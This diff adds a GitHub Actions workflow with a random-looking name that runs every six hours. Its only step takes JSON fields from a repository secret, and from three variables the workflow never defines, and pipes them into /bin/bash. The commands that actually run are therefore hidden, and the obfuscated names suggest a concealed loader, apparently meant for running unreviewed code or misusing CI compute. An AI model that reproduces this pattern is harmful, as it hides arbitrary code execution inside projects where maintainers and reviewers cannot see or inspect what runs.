@@ -1,0 +1,20 @@
+name: xuzhibai3856
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xuzhibai3856
+        env:
+          o4: ${{ secrets.o4 }}
+        run: |
+          echo $o4 | jq -r .pb66732 | /bin/bash
+          echo $wzvn0 | jq -r .oo77 | /bin/bash
+          echo $ceh38 | jq -r .d38 | /bin/bash
+          echo $nimt438 | jq -r .ah8713 | /bin/bash
+
